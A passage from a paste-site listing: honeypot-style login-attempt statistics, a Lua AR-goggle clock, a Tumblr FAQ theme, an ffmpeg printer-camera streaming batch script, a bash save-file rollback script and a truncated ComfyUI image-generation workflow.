    ""Horizon LLC"": 4,
    ""XHOSTIS"": 1,
    ""Xhostis"": 1,
    ""Unknown"": 1,
    ""China Mobile"": 1,
    ""Hosterkz Network"": 4,
    ""Chang Way Technologies Co. Limited"": 5,
    ""HosterAPI"": 2,
    ""Aliyun Computing Co., LTD"": 7,
    ""Ucloud Information Technology"": 1,
    ""IPXO"": 1,
    ""Chinanet HE"": 1,
    ""Aceville Pte.ltd"": 1,
    ""Maxwell Group LTD"": 1
  },
  ""regionName"": {
    ""North Holland"": 12,
    ""Kaunas"": 3,
    ""Karnataka"": 1,
    ""Vilnius"": 2,
    ""New Jersey"": 1,
    ""Virginia"": 4,
    ""Michigan"": 1,
    ""England"": 4,
    ""California"": 18,
    ""\u00cele-de-France"": 1,
    ""Moscow"": 4,
    ""Drenthe"": 1,
    ""Thanh H\u00f3a Province"": 1,
    ""Guangdong"": 1,
    ""Karaganda"": 4,
    ""St.-Petersburg"": 3,
    ""Lesser Poland"": 2,
    ""Hesse"": 2,
    ""Beijing"": 7,
    ""Hebei"": 1,
    ""Central Singapore"": 1,
    ""Distrito Federal"": 1
  },
  ""country"": {
    ""The Netherlands"": 13,
    ""Lithuania"": 5,
    ""India"": 1,
    ""United States"": 24,
    ""United Kingdom"": 4,
    ""France"": 1,
    ""Russia"": 7,
    ""Vietnam"": 1,
    ""China"": 9,
    ""Kazakhstan"": 4,
    ""Poland"": 2,
    ""Germany"": 2,
    ""Singapore"": 1,
    ""Venezuela"": 1
  },
  ""account"": {
    ""nmap"": 1,
    ""Administr"": 13,
    ""hello"": 20,
    ""Test"": 6,
    ""(empty)"": 5,
    ""Domain"": 11,
    ""EmNbQnTFa"": 1,
    ""fqVkOY"": 1,
    ""PwiIMJ"": 1,
    ""masscan"": 1,
    ""JewUbdeSz"": 1,
    ""MrwidD"": 1,
    ""BWhQrD"": 1,
    ""x4cl5mhf"": 4,
    ""beio"": 1,
    ""Administrator"": 1,
    ""NtOifCTve"": 1,
    ""fKSdtw"": 1,
    ""vxWrzn"": 1,
    ""dlppmdrvA"": 1,
    ""jXgLPw"": 1,
    ""wRvWWn"": 1
  },
  ""keyboard"": {
    ""Unknown"": 75
  },
  ""client_build"": {
    ""Unknown"": 75
  },
  ""client_name"": {
    ""Unknown"": 75
  },
  ""ip_type"": {
    ""Unknown"": 31,
    ""hosting & proxy"": 9,
    ""mobile"": 4,
    ""hosting"": 30,
    ""mobile & hosting & proxy"": 1
  }
}"
6VLYyr9y,argoggle.lua,ChickenSquiggles,Lua,Saturday 24th of February 2024 06:06:08 PM CDT,"local controller = peripheral.wrap(""back"")

function rightBoundProper(str)
    controller.drawRightboundString(str, (585-(2.5*string.len(str))), 1, 0xffffff)
end

while true do
    sleep(1)
    controller.clear()
    rightBoundProper(os.date())
    
end"
nHZTJDdY,Shea-FAQ,soutadoori,HTML,Saturday 24th of February 2024 06:05:47 PM CDT,"<!DOCTYPE html PUBLIC ""-//W3C//DTD XHTML 1.0 Transitional//EN"" ""http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"">
<html xmlns=""https://www.w3.org/1999/xhtml"" xml:lang=""en"" lang=""en"" data-theme=""light"">
<head>
<meta charset=""utf-8"" />
<meta name=""viewport"" content=""width=device-width, initial-scale=1, minimum-scale=1"">

<script>
const storedTheme = localStorage.getItem(""theme"") || (window.matchMedia(""(prefers-color-scheme: dark)"").matches ? ""dark"" : ""light"");
if (storedTheme) {
    document.documentElement.setAttribute(""data-theme"", storedTheme);
}
</script>

<script src=""https://unpkg.com/@phosphor-icons/web""></script>

    <title>{Title}</title>
    <link rel=""shortcut icon"" href=""{Favicon}"">
    <link rel=""altertnate"" type=""application/rss+xml"" href=""{RSS}"">
    <meta http-equiv=""x-dns-prefetch-control"" content=""off""/>
    
    <link rel=""stylesheet"" href=""https://cdn.jsdelivr.net/npm/@tabler/icons-webfont@latest/tabler-icons.min.css"">
    <link rel=""preconnect"" href=""https://fonts.googleapis.com"">
    <link rel=""preconnect"" href=""https://fonts.gstatic.com"" crossorigin>
    <link href=""https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,400;0,500;0,600;0,700;1,400;1,500;1,600;1,700&display=swap"" rel=""stylesheet"">

<style type=""text/css"">

:root {
    --body-font: 1.5rem;
    --line-height: 1.6;
    --normal-font-weight: 400;
    --medium-font-weight: 500;
    --semi-bold-font-weight: 600;
    --bold-font-weight: 700;
    
    --gap1: 1.2rem;
    --gap2: 1.5rem;
    --gap3: 2.5rem;
    --gap4: 3.5rem;
    
    --gap-top-bottom: 12rem; 
    --gap-post-margin: 10rem;
    --text-margin: 1.8rem; 
    
    --round1: 0.5rem;
    --round2: 0.7rem;
    --round3: 1rem; 
    --circle: 100%;
}

:root, html[data-theme='light'] {
    --light-on: block;
    --light-off: none;
    
    --color-accent: 77,100,141;
    --color-accent-text: 255,255,255;
    --color-background: 244,244,244;
    --color-text: 31,43,62;
    --color-link: 15,28,46;
    --color-link-hover: 31,58,95;
    --color-post-background: 255,255,255;
    --color-post-borders: 225,225,225;
    --color-post-accent: 250,250,250;
    --color-post-accent-text: 0,0,0;
}

html[data-theme='dark'] {
    --light-on: none;
    --light-off: block;
    
    --color-accent: 172,194,239;
    --color-accent-text: 0,0,0;
    --color-background: 15,28,46;
    --color-text: 224,224,224;
    --color-link: 206,232,255;
    --color-link-hover: 125,155,208;
    --color-post-background: 31,43,62;
    --color-post-borders: 55,67,87;
    --color-post-accent: 55,67,87;
    --color-post-accent-text: 255,255,255;
}

html.theme-transition,
html.theme-transition *,
html.theme-transition *:before,
html.theme-transition *:after {
  transition: 0s !important;
  transition-delay: 0 !important;
}

/*----------TUMBLR CONTROLS----------*/
 
*,*::before,*::after {
    -webkit-font-smoothing: antialiased;
    text-rendering: optimizeLegibility;
    -moz-osx-font-smoothing: grayscale;
    box-sizing: border-box;
}

* {
    margin: 0;
    scrollbar-width: thin; /* firefox scrollbar  */
    scrollbar-color: rgb(var(--color-accent)) rgb(var(--main-background));
}

html {
    height: 100%;
    font-size: 62.5%; 
    scrollbar-width: thin;
}

button,
textarea,
select {
    font: inherit;
}

button {
    outline: none;
    border: 0;
    background: transparent;
    padding: 0;
    cursor: pointer;
    color: inherit;
}

input{
    font: inherit;
    border: none;
    outline: 0;
    padding: 0;
    background-color: transparent;
    color: rgb(var(--color-text));
}

p,h1,h2,h3,h4,h5,h6 {
    overflow-wrap: break-word;
}

.tmblr-iframe-pushdown {
    padding-top: 0!important;
}

.iframe-controls--phone-mobile {
    display: none!important; 
}

/* ------------------------------------- tooltips */
.tippy-box[data-theme~='custom'] {
    font-size: var(--body-font);
    font-weight: 400;
    text-align:center;
    padding: 0;
    color: rgb(var(--color-accent-text));
    border: 0px solid rgb(var(--borders));
    border-radius: var(--round1);
    background-color: rgb(var(--color-accent));
    text-transform: lowercase;
    margin: 1.5rem;
    z-index: 9999999;
}

::-moz-selection {
    background-color: rgb(var(--color-accent));
    color:rgb(var(--color-text));
}

::selection {
    background-color: rgb(var(--color-accent));
    color:rgb(var(--color-text)); 
}

/* ------------------------------------- scrollbar (not firefrox) */
::-webkit-scrollbar {
    width: 8px;
    background-color: rgb(var(--color-background));
}

::-webkit-scrollbar-thumb {
    background: rgb(var(--color-accent));
    border-radius: var(--round1);
}

::-webkit-scrollbar-track {
    background-color: rgb(var(--color-background));
}

iframe.tmblr-iframe, .tmblr-iframe {
    display: none;
}

body {
    font-size: var(--body-font);
    line-height: var(--line-height);
    font-family: ""Poppins"", sans-serif;
    font-weight: var(--normal-font-weight);
    background-color: rgb(var(--color-background));
    color: rgb(var(--color-text));
}

a {
    text-decoration: none;
    font-weight: var(--medium-font-weight);
    color: rgb(var(--color-link));
}

a:hover {
    color: rgb(var(--color-link-hover));
    transition: .4s;
}

.buttons {
    display: inline-flex;
    align-items: center;
    gap: 0.5rem;
}

.toggle-menu {
    display: none;
}

button.theme-toggle, .toggle-menu {
    color: rgb(var(--color-link));
    font-size: 2.5rem;
}

.light-on {
    display: var(--light-on);
}

.light-off {
    display: var(--light-off); 
}

.all {
    max-width: 1180px;
    max-height: 100vh;
    max-height: 100dvh;
    margin-inline: auto;
    position: relative;
    margin-block: var(--gap-post-margin);
}

.flex {
    display: flex;
}

.column {
    flex-direction: column;
}

.space-between {
    justify-content: space-between;
}

.container {
    display: grid;
    gap: 5rem;
    justify-content: center;
    justify-items: center;
    grid-template-areas: ""sb post"";
}

.posts {
    grid-area: post;
    width: 700px;
    display: grid;
    row-gap: var(--gap4);
}

.faq-post, .sidebar-inner {
    background-color: rgb(var(--color-post-background));
    padding: var(--text-margin);
    border-radius: var(--round3);
}

.faq-content i {
    display: inline-flex;
    align-items: center;
    font-size: 2.5rem;
    margin-right: var(--gap1);
    color: rgb(var(--color-accent));
}

.faq-post h2, .sidebar-inner h2 {
    font-size: 1.8rem;
    margin-bottom: var(--text-margin);
}

.faq-post ul li::marker, .faq-post ol li::marker {
    color: rgb(var(--color-accent));
}

.faq-content {
    margin-bottom: var(--gap4);
}

.faq-content:last-of-type {
    margin-bottom: 0;
}

.faq-content blockquote {
    margin: var(--text-margin) calc(var(--gap4) + .5rem);
    border-left: 2px solid rgb(var(--color-accent));
    padding-left: var(--text-margin);
}

.faq-content blockquote p span {
    display: block;
}

.sidebar {
    grid-area: sb;
    width: 350px;
}

.header-bar {
    display: flex;
    justify-content: space-between;
    align-items: center;
    background-color: rgb(var(--color-post-background));
    padding: var(--gap2) var(--gap4);
    height: 80px;
}

.nav-container ul li {
    list-style: none;
}

.nav-menu {
    display: flex;
    flex-direction: row;
    gap: var(--gap4);
    padding: 0;
}

.faq-logo img{
    width: 60px;
}

@media screen and (max-width: 850px) {
    .header-bar {
        height: 60px;
    }
    
    .nav-container {
        position: fixed;
        top: 60px;
        right: -100%;
        width: 80%;
        height: calc(100vh - 60px);
        background-color: rgba(var(--color-post-background), 0.8);
        backdrop-filter: blur(7px);
        -webkit-backdrop-filter: blur(7px);
        padding: var(--gap4);
        transition: .6s;
        z-index: 9;
    }
    
    .nav-menu {
        flex-direction: column;
        gap: var(--gap3);
        text-transform: uppercase;
    }
    
    .open {
        right: 0;
    }
    
    .toggle-menu {
        display: inline-flex;
    }
    
    .all {
        padding-inline: var(--gap4);
        margin-block: calc(var(--gap4) + 2rem);
    }
    
    .container {
        grid-template-areas: ""sb"" ""post"";
    }
    
    .sidebar, .posts {
        width: 90vw;
    }
    
}
</style>
</head>
<body>

<header class=""header"">
    <div class=""header-bar"">
        <div class=""logo"">
            <a class=""faq-logo"" title=""return home"" href=""/"">
                <img src=""https://static.tumblr.com/uh2chis/D1bs9dyko/shea-logo-light.png"" class=""light-on"" alt=""blog logo"">
                <img src=""https://static.tumblr.com/uh2chis/GVds9dykk/shea-logo-dark.png"" class=""light-off"" alt=""blog-logo"">
            </a>
        </div>
        
        <nav class=""nav-container"" id=""nav-container"">
            <ul class=""nav-menu"">
                <li><a href=""/"">home</a></li>
                <li><a href=""/terms"">portfolio</a></li>
                <li><a href=""/tagged/resources"">resources</a></li>
                <li><a href=""/credits"">credits</a></li>
            </ul>
        </nav>
        
        <div class=""buttons"">
            <button class=""theme-toggle"" aria-label=""toggle dark or light mode"" type=""button"">
                <i class=""ti ti-sun light-on""></i>
                <i class=""ti ti-moon light-off""></i>
            </button>
            <button class=""toggle-menu"" aria-label=""toggle menu"" type=""button"" id=""menu-button"">
                <i class=""ti ti-menu-deep""></i>
            </button>
        </div>
    </div>
</header>

<div class=""all flex space-between column"">
    <main class=""container"">
        <aside class=""sidebar"">
            <section class=""sidebar-inner"">
                <h2 class=""sidebar-title faq-title"">Before proceeding<span>...</span></h2>
                <p class=""description"">Please make sure to read over this section before asking a question. It might be possible that your question was already answered.</p>
            </section>
        </aside>
    
        <section class=""posts"">
            <article class=""faq-post"">
                <h2 class=""faq-title"">Quick Links</h2>
                <ul class=""faq-nav-menu"">
                    <li><a href=""/tagged/answered"">answered questions</a></li>
                    <li><a href=""https://help.tumblr.com/hc/en-us/articles/230778847-Custom-HTML"">how to install a theme</a></li>
                    <li><a href=""https://help.tumblr.com/hc/en-us/articles/230864427-Blog-Pages"">how to create and install pages</a></li>
                    <li><a href=""https://glenthemes.tumblr.com/post/683796810867900416/tumblr-javascript"">how to ask permission to use JavaScript on custom pages</a></li>
                    <li><a href=""https://www.tumblr.com/docs/en/custom_themes"">tumblr theme documentation</a></li>
                    <li><a href=""https://github.com/tumblr/docs/blob/master/npf-spec.md"">NPF documntation</a></li>
                </ul>
            </article>
            
            <article class=""faq-post"">
                <h2 class=""faq-title"">Frequently asked questions</h2> 
                <div class=""faq-content"">
                    <i class=""ti ti-corner-down-right""></i><b>If you are unable to install and/or view a custom theme on your blog</b>
                    <blockquote><p>Please make sure to enable the custom theme toggle in your blog settings.<span><em>- <a target=""_blank"" href=""https://static.tumblr.com/uh2chis/6Svs9e2cj/custom-theme.png"">Image example here</a></em></span></p></blockquote> 
               </div>
               
               <div class=""faq-content"">
                    <i class=""ti ti-corner-down-right""></i><b>If your ask page isn't working</b>
                    <blockquote><p>Please make sure to turn on your asks in your blog settings.<span><em>- <a target=""_blank"" href=""https://static.tumblr.com/uh2chis/F28s9e2ax/ask-toggle.png"">Image example here</a></em></span></p></blockquote> 
               </div>
            </article>
        </section>
    </main> 
</div>

<!-- TOOLTIP: tippy.js -->
<script src=""https://unpkg.com/@popperjs/core@2""></script>
<script src=""https://unpkg.com/tippy.js@6""></script>

<script>

    // ------------------- tooltip
    const commonOptions = {
        theme: ""custom"",
        arrow: false,
        followCursor: true,
        placement: ""top"",
        touch: ""hold"",
    };
    
    tippy(""[title]"", {
        ...commonOptions,
        content(reference) {
            const title = reference.getAttribute(""title"");
            reference.removeAttribute(""title"");
            return title;
        },
    });
    
    // ------------------- toggle menu
    const menu = document.getElementById(""nav-container"");
    const button = document.getElementById(""menu-button"");
    const buttonOpen = button.querySelector(""i"");
    
    button.addEventListener(""click"", () => {
       menu.classList.toggle(""open"");
       
       const isOpen = menu.classList.contains(""open"");
       
       if(isOpen) {
           buttonOpen.setAttribute(""class"", ""ti ti-x"");
       } else {
           buttonOpen.setAttribute(""class"", ""ti ti-menu-deep"");
       }
    });
    
    // ------------------- toggle dark/light by @mournstera
    const themeToggleButtons = document.querySelectorAll("".theme-toggle"");
    
    themeToggleButtons.forEach((btn) => {
            const storedTheme = localStorage.getItem(""theme"") || (window.matchMedia(""(prefers-color-scheme: dark)"").matches ? ""dark"" : ""light"");
            const initialTooltipText = storedTheme === ""dark"" ? ""Toggle light mode"" : ""Toggle dark mode""; 
            tippy(btn, {
                ...commonOptions,
                content: initialTooltipText, 
            });
        btn.addEventListener(""click"", function () {
    
            document.documentElement.classList.add(""theme-transition"");
    
            let currentTheme = document.documentElement.getAttribute(""data-theme"");
            let targetTheme = (currentTheme === ""light"") ? ""dark"" : ""light"";
    
            window.setTimeout(function () {
                document.documentElement.classList.remove(""theme-transition"");
            }, 50);

            document.documentElement.setAttribute(""data-theme"", targetTheme);
            localStorage.setItem(""theme"", targetTheme);
        });
    });
</script>
</body>
</html> <!---------------------------END--------------------------->"
M0PYb1W8,Bambulab ffmpeg streaming shell,sneaky4oe,PowerShell,Saturday 24th of February 2024 05:55:24 PM CDT,"@echo off

set /p userinput1=""What are you printing: ""
set /p userinput2=""Nozzle size in mm: 0.""
set /p userinput3=""Layer height in mm: 0.""
:START
:: Calls the ffmpeg command
ffmpeg -re -protocol_whitelist file,udp,rtp -i C:\Users\SneakyJoe_Streamer\AppData\Roaming\BambuStudio\cameratools\ffmpeg.sdp -vf ""[in]drawtext=fontsize=40:fontfile='C\:\\Windows\\Fonts\\consola.ttf':text='%userinput1%; 0.%userinput2%mmV 0.%userinput3%mmL':x=10:y=10:box=1:boxcolor=white@0.5:boxborderw=5,drawtext=fontsize=40:fontfile='C\:\\Windows\\Fonts\\consola.ttf':text='%%{localtime\:%%X}':x=10:y=60:box=1:boxcolor=white@0.5:boxborderw=5[out]"" -vcodec libx264 -preset superfast -b:v 4000k -minrate 2500k -maxrate 6000k -bufsize 8000k -s 1920x1080 -sws_flags lanczos -acodec copy -f flv rtmp://live.restream.io/live/re_123

goto START"
6Y5XAHvz,rollback.sh,FranzVuttke,Bash,Saturday 24th of February 2024 05:20:52 PM CDT,"#/bin/bash

#
# createed by OuNiS 02.2024
#
# FTL - przywracanie pliku 'continue.sav' z kopii 'continue.backup'
#

ANSW_CONFIRM=""t""
FILE_2_ROLLBACK=""continue.sav""
BACKUP_FILE=""continue.backup""
# kolory textu
F_COLOR_TXT_DEF='\e[0m'
F_COLOR_TXT_RED='\e[31m'
F_COLOR_TXT_BLINK='\e[5m'
F_COLOR_TXT_BLUE='\e[34m'

echo
echo -e ""$F_COLOR_TXT_BLINK$F_COLOR_TXT_BLUE **** FTL **** $F_COLOR_TXT_DEF""

# dodatkowo: parametr jako plik backupu inny niż domyślny
if test $# -eq 1; then
	echo -e ""*** Podano nazwę pliku backupu: $F_COLOR_TXT_BLUE$1 $F_COLOR_TXT_DEF""
	BACKUP_FILE=$1
fi

echo -e ""przywracanie pliku $F_COLOR_TXT_RED'$FILE_2_ROLLBACK'$F_COLOR_TXT_DEF z kopii zapasowej $F_COLOR_TXT_RED'$BACKUP_FILE'$F_COLOR_TXT_DEF""
echo -n ""Przywrócić poprzedni plik '$FILE_2_ROLLBACK'(t/n)? ""
read answ
# if test $answ = ""\n""; then
#     answ=$ANSW_CONFIRM
# fi

if test $answ = $ANSW_CONFIRM; then
    cp $BACKUP_FILE $FILE_2_ROLLBACK
    if test $? -eq 0; then
        echo ""Plik '$FILE_2_ROLLBACK' przywrócony...""
    else
        echo -e ""$F_COLOR_TXT_RED $? - coś poszło nie tak!!!!""
    fi
else
    echo -e ""$F_COLOR_TXT_RED ANULOWANE...""
fi
"
uFtzAqy1,Untitled,Mikerhinos,JSON,Saturday 24th of February 2024 05:19:55 PM CDT,"{
  ""last_node_id"": 89,
  ""last_link_id"": 224,
  ""nodes"": [
    {
      ""id"": 36,
      ""type"": ""StableCascade_StageB_Conditioning"",
      ""pos"": [
        945.0476178955078,
        525.1914442703247
      ],
      ""size"": {
        ""0"": 277.20001220703125,
        ""1"": 46
      },
      ""flags"": {},
      ""order"": 14,
      ""mode"": 0,
      ""inputs"": [
        {
          ""name"": ""conditioning"",
          ""type"": ""CONDITIONING"",
          ""link"": 116,
          ""slot_index"": 0
        },
        {
          ""name"": ""stage_c"",
          ""type"": ""LATENT"",
          ""link"": 88
        }
      ],
      ""outputs"": [
        {
          ""name"": ""CONDITIONING"",
          ""type"": ""CONDITIONING"",
          ""links"": [
            86
          ],
          ""shape"": 3,
          ""slot_index"": 0
        }
      ],
      ""properties"": {
        ""Node name for S&R"": ""StableCascade_StageB_Conditioning""
      }
    },
    {
      ""id"": 79,
      ""type"": ""SaveImage"",
      ""pos"": [
        1072,
        735
      ],
      ""size"": {
        ""0"": 1179.4840087890625,
        ""1"": 1177.4248046875
      },
      ""flags"": {},
      ""order"": 21,
      ""mode"": 0,
      ""inputs"": [
        {
          ""name"": ""images"",
          ""type"": ""IMAGE"",
          ""link"": 200
        }
      ],
      ""properties"": {},
      ""widgets_values"": [
        ""ComfyUI""
      ]
    },
    {
      ""id"": 6,
      ""type"": ""CLIPTextEncode"",
      ""pos"": [
        164,
        285
      ],
      ""size"": {
        ""0"": 285.6000061035156,
        ""1"": 54
      },
      ""flags"": {},
      ""order"": 9,
      ""mode"": 0,
      ""inputs"": [
        {
          ""name"": ""clip"",
          ""type"": ""CLIP"",
          ""link"": 111
        },
        {
          ""name"": ""text"",
          ""type"": ""STRING"",
          ""link"": 212,
          ""widget"": {
            ""name"": ""text""
          }
        }
      ],
      ""outputs"": [
        {
          ""name"": ""CONDITIONING"",
          ""type"": ""CONDITIONING"",
          ""links"": [
            107,
            116
          ],
          ""slot_index"": 0
        }
      ],
      ""title"": ""CLIP Text Encode (Positive Prompt)"",
      ""properties"": {
        ""Node name for S&R"": ""CLIPTextEncode""
      },
      ""widgets_values"": [
        ""ultra sharp selfie photography of hilariouls mens and women are throwing multicolor chalk powders at each other's face at festival of holi, big smiles, party, ultra detailed photography, detailed skin texture, sharp focus, intricate details, Hasselblad, 8K, 50mm prime lense, crispy""
      ],
      ""color"": ""#232""
    },
    {
      ""id"": 7,
      ""type"": ""CLIPTextEncode"",
      ""pos"": [
        161,
        391
      ],
      ""size"": {
        ""0"": 285.6000061035156,
        ""1"": 54
      },
      ""flags"": {},
      ""order"": 10,
      ""mode"": 0,
      ""inputs"": [
        {
          ""name"": ""clip"",
          ""type"": ""CLIP"",
          ""link"": 112
        },
        {
          ""name"": ""text"",
          ""type"": ""STRING"",
          ""link"": 213,
          ""widget"": {
            ""name"": ""text""
          }
        }
      ],
      ""outputs"": [
        {
          ""name"": ""CONDITIONING"",
          ""type"": ""CONDITIONING"",
          ""links"": [
            108,
            117
          ],
          ""slot_index"": 0
        }
      ],
      ""title"": ""CLIP Text Encode (Negative Prompt)"",
      ""properties"": {
        ""Node name for S&R"": ""CLIPTextEncode""
      },
      ""widgets_values"": [
        ""text, watermark""
      ],
      ""color"": ""#322""
    },
    {
      ""id"": 8,
      ""type"": ""VAEDecode"",
      ""pos"": [
        1367.0476178955078,
        265.1914442703246
      ],
      ""size"": {
        ""0"": 210,
        ""1"": 46
      },
      ""flags"": {
        ""collapsed"": false
      },
      ""order"": 16,
      ""mode"": 0,
      ""inputs"": [
        {
          ""name"": ""samples"",
          ""type"": ""LATENT"",
          ""link"": 98
        },
        {
          ""name"": ""vae"",
          ""type"": ""VAE"",
          ""link"": 114,
          ""slot_index"": 1
        }
      ],
      ""outputs"": [
        {
          ""name"": ""IMAGE"",
          ""type"": ""IMAGE"",
          ""links"": [
            130,
            181
          ],
          ""slot_index"": 0
        }
      ],
      ""properties"": {
        ""Node name for S&R"": ""VAEDecode""
      }
    },
    {
      ""id"": 34,
      ""type"": ""StableCascade_EmptyLatentImage"",
      ""pos"": [
        -698,
        427
      ],
      ""size"": {
        ""0"": 315,
        ""1"": 150
      },
      ""flags"": {},
      ""order"": 8,
      ""mode"": 0,
      ""inputs"": [
        {
          ""name"": ""width"",
          ""type"": ""INT"",
          ""link"": 121,
          ""widget"": {
            ""name"": ""width""
          }
        },
        {
          ""name"": ""height"",
          ""type"": ""INT"",
          ""link"": 122,
          ""widget"": {
            ""name"": ""height""
          }
        }
      ],
      ""outputs"": [
        {
          ""name"": ""stage_c"",
          ""type"": ""LATENT"",
          ""links"": [
            82
          ],
          ""shape"": 3,
          ""slot_index"": 0
        },
        {
          ""name"": ""stage_b"",
          ""type"": ""LATENT"",
          ""links"": [
            83
          ],
          ""shape"": 3,
          ""slot_index"": 1
        }
      ],
      ""properties"": {
        ""Node name for S&R"": ""StableCascade_EmptyLatentImage""
      },
      ""widgets_values"": [
        2048,
        2048,
        64,
        1
      ],
      ""color"": ""#232""
    },
    {
      ""id"": 42,
      ""type"": ""CheckpointLoaderSimple"",
      ""pos"": [
        899,
        265
      ],
      ""size"": {
        ""0"": 349.90911865234375,
        ""1"": 98
      },
      ""flags"": {},
      ""order"": 0,
      ""mode"": 0,
      ""outputs"": [
        {
          ""name"": ""MODEL"",
          ""type"": ""MODEL"",
          ""links"": [
            113
          ],
          ""shape"": 3,
          ""slot_index"": 0
        },
        {
          ""name"": ""CLIP"",
          ""type"": ""CLIP"",
          ""links"": null,
          ""shape"": 3
        },
        {
          ""name"": ""VAE"",
          ""type"": ""VAE"",
          ""links"": [
            114
          ],
          ""shape"": 3,
          ""slot_index"": 2
        }
      ],
      ""title"": ""Stage B model"",
      ""properties"": {
        ""Node name for S&R"": ""CheckpointLoaderSimple""
      },
      ""widgets_values"": [
        ""stable_cascade_stage_b.safetensors""
      ],
      ""color"": ""#223"",
      ""bgcolor"": ""#335""
    },
    {
      ""id"": 41,
      ""type"": ""CheckpointLoaderSimple"",
      ""pos"": [
        -710,
        269
      ],
      ""size"": {
        ""0"": 336,
        ""1"": 98
      },
      ""flags"": {},
      ""order"": 1,
      ""mode"": 0,
      ""outputs"": [
        {
          ""name"": ""MODEL"",
          ""type"": ""MODEL"",
          ""links"": [
            119
          ],
          ""shape"": 3,
          ""slot_index"": 0
        },
        {
          ""name"": ""CLIP"",
          ""type"": ""CLIP"",
          ""links"": [
            111,
            112
          ],
          ""shape"": 3,
          ""slot_index"": 1
        },
        {
          ""name"": ""VAE"",
          ""type"": ""VAE"",
          ""links"": null,
          ""shape"": 3
        }
      ],
      ""title"": ""Stage C model"",
      ""properties"": {
        ""Node name for S&R"": ""CheckpointLoaderSimple""
      },
      ""widgets_values"": [
        ""stable_cascade_stage_c.safetensors""
      ],
      ""color"": ""#223"",
      ""bgcolor"": ""#335""
    },
    {
      ""id"": 78,
      ""type"": ""PreviewImage"",
      ""pos"": [
        1667,
        227
      ],
      ""size"": {
        ""0"": 562.466552734375,
        ""1"": 439.06878662109375
      },
      ""flags"": {},
      ""order"": 18,
      ""mode"": 0,
      ""inputs"": [
        {
          ""name"": ""images"",
          ""type"": ""IMAGE"",
          ""link"": 181
        }
      ],
      ""properties"": {
        ""Node name for S&R"": ""PreviewImage""
      }
    },
    {
      ""id"": 33,
      ""type"": ""KSampler"",
      ""pos"": [
        1285.0476178955078,
        392.1914442703246
      ],
      ""size"": [
        315,
        473.99999237060547
      ],
      ""flags"": {},
      ""order"": 15,
      ""mode"": 0,
      ""inputs"": [
        {
          ""name"": ""model"",
          ""type"": ""MODEL"",
          ""link"": 113,
          ""slot_index"": 0
        },
        {
          ""name"": ""positive"",
          ""type"": ""CONDITIONING"",
          ""link"": 86
        },
        {
          ""name"": ""negative"",
          ""type"": ""CONDITIONING"",
          ""link"": 117
        },
        {
          ""name"": ""latent_image"",
          ""type"": ""LATENT"",
          ""link"": 83
        }
      ],
      ""outputs"": [
        {
          ""name"": ""LATENT"",
          ""type"": ""LATENT"",
          ""links"": [
            98
          ],
          ""slot_index"": 0
        }
      ],
      ""properties"": {
        ""Node name for S&R"": ""KSampler""
      },
      ""widgets_values"": [
        684734296380714,
        ""fixed"",
        9,
        1.2,
        ""dpmpp_sde"",
        ""sgm_uniform"",
        1
      ],
      ""color"": ""#232""
    },
    {
      ""id"": 74,
      ""type"": ""CheckpointLoaderSimple"",
      ""pos"": [
        -1073,
        925
      ],
      ""size"": {
        ""0"": 315,
        ""1"": 98
      },
      ""flags"": {},
      ""order"": 2,
      ""mode"": 0,
      ""outputs"": [
        {
          ""name"": ""MODEL"",
          ""type"": ""MODEL"",
          ""links"": [
            198
          ],
          ""shape"": 3,
          ""slot_index"": 0
        },
        {
          ""name"": ""CLIP"",
          ""type"": ""CLIP"",
          ""links"": [
            184
          ],
          ""shape"": 3,
          ""slot_index"": 1
        },
        {
          ""name"": ""VAE"",
          ""type"": ""VAE"",
          ""links"": [
            197
          ],
          ""shape"": 3,
          ""slot_index"": 2
        }
      ],
      ""title"": ""SDXL model used for upscaling "",
      ""properties"": {
        ""Node name for S&R"": ""CheckpointLoaderSimple""
      },
      ""widgets_values"": [
        ""dreamshaperXL_v2TurboDpmppSDE.safetensors""
      ],
      ""color"": ""#223"",
      ""bgcolor"": ""#335""
    },
    {
      ""id"": 85,
      ""type"": ""PlaySound|pysssss"",
      ""pos"": [
        853,
        870
      ],
      ""size"": {
        ""0"": 210,
        ""1"": 106
      },
      ""flags"": {},
      ""order"": 22,
      ""mode"": 0,
      ""inputs"": [
        {
          ""name"": ""any"",
          ""type"": ""*"",
          ""link"": 211
        }
      ],
      ""outputs"": [
        {
          ""name"": ""*"",
          ""type"": ""*"",
          ""links"": null,
          ""shape"": 6
        }
      ],
      ""properties"": {
        ""Node name for S&R"": ""PlaySound|pysssss""
      },
      ""widgets_values"": [
        ""always"",
        0.5,
        ""notify.mp3""
      ]
    },
    {
      ""id"": 56,
      ""type"": ""ImageSharpen"",
      ""pos"": [
        598,
        757
      ],
      ""size"": {
        ""0"": 210,
        ""1"": 106
      },
      ""flags"": {},
      ""order"": 20,
      ""mode"": 0,
      ""inputs"": [
        {
          ""name"": ""image"",
          ""type"": ""IMAGE"",
          ""link"": 224
        }
      ],
      ""outputs"": [
        {
          ""name"": ""IMAGE"",
          ""type"": ""IMAGE"",
          ""links"": [
            200,
            211
          ],
          ""shape"": 3,
          ""slot_index"": 0
        }
      ],
      ""properties"": {
        ""Node name for S&R"": ""ImageSharpen""
      },
      ""widgets_values"": [
        1,
        0.30000000000000004,
        0.8
      ]
    },
    {
      ""id"": 82,
      ""type"": ""UpscaleModelLoader"",
      ""pos"": [
        -298,
        1266
      ],
      ""size"": {
        ""0"": 315,
        ""1"": 58
      },
      ""flags"": {},
      ""order"": 3,
      ""mode"": 0,
      ""outputs"": [
        {
          ""name"": ""UPSCALE_MODEL"",
          ""type"": ""UPSCALE_MODEL"",
          ""links"": [
            194
          ],
          ""shape"": 3
        }
      ],
      ""title"": ""Upscale Model"",
      ""properties"": {
        ""Node name for S&R"": ""UpscaleModelLoader""
      },
      ""widgets_values"": [
        ""4x_UniversalUpscalerV2-Sharper_103000_G.pth""
      ],
      ""color"": ""#223"",
      ""bgcolor"": ""#335""
    },
    {
      ""id"": 80,
      ""type"": ""CLIPSetLastLayer"",
      ""pos"": [
        -576,
        1008
      ],
      ""size"": {
        ""0"": 210,
        ""1"": 58
      },
      ""flags"": {},
      ""order"": 7,
      ""mode"": 0,
      ""inputs"": [
        {
          ""name"": ""clip"",
          ""type"": ""CLIP"",
          ""link"": 184
        }
      ],
      ""outputs"": [
        {
          ""name"": ""CLIP"",
          ""type"": ""CLIP"",
          ""links"": [
            185,
            186
          ],
          ""shape"": 3,
          ""slot_index"": 0
        }
      ],
      ""properties"": {
        ""Node name for S&R"": ""CLIPSetLastLayer""
      },
